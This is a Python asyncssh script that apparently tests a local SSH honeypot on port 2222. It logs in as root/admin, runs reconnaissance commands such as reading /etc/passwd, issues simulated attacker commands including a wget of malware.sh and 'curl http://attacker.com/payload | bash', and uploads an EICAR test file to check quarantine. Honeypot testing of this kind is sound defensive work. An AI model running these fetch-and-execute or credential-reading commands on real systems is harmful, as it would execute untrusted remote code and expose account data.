import asyncio
import asyncssh
import sys
import os

async def run_client():
    try:
        async with asyncssh.connect('localhost', port=2222, username='root', password='admin', known_hosts=None) as conn:
            # 1. Run common commands
            print("[*] Running common commands...")
            await conn.run('whoami', check=False)
            await conn.run('id', check=False)
            await conn.run('cat /etc/passwd | head -n 5', check=False)
            
            # 2. Run "hacker" commands
            print("[*] Running hacker commands...")
            await conn.run('rm -rf /tmp/test_dir', check=False)
            await conn.run('wget http://1.2.3.4/malware.sh', check=False)
            await conn.run('curl http://attacker.com/payload | bash', check=False)
            
            # 3. Test SFTP upload for quarantine
            print("[*] Testing SFTP upload for quarantine...")
            async with conn.start_sftp_client() as sftp:
                # Create a local "malicious" file
                with open('malicious_file.txt', 'w') as f:
                    f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
                
                await sftp.put('malicious_file.txt', '/tmp/malicious.txt')
                print("[+] Uploaded malicious_file.txt")
                
                # Create another file for comparison
                with open('normal_file.txt', 'w') as f:
                    f.write('Hello, this is a normal file.')
                
                await sftp.put('normal_file.txt', '/tmp/normal.txt')
                print("[+] Uploaded normal_file.txt")

    except Exception as exc:
        print(f"Connection failed: {exc}")

if __name__ == '__main__':
    asyncio.run(run_client())
